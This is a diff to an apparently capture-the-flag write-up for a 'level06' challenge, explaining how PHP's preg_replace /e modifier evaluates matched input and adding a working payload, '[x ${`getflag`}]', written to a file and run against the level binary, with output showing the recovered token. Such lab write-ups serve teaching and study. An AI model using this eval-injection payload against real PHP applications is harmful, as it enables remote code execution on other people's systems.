@@ -26,8 +26,14 @@ print $r;
 
 This php script seems to read a file, replace some regular expression found in it with the result of the y function.
 
-This script use preg_replace with the 'e' option who is a vulnerability.
+This script use preg_replace with the 'e' option which is a vulnerability.
 
-We found on the internet that the /e modifier in the regular expression will cause PHP to eval our input and execute the second argument.
+We found on the internet that the /e modifier in the regular expression will cause PHP preg_replace() to eval our input matching the regex, in our case '[x .]', so we will write our code in place of the dot.
 
-[x system('getflag');] does not work -_-
+Using a second exploit, abusing the variable variables, PHP will execute what's written in ${}, thinking that `getflag` is a variable name, executing the function.
+
+```bash
+$ echo '[x ${`getflag`}]' > /tmp/flag06
+$ ./level06 /tmp/flag06
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+```
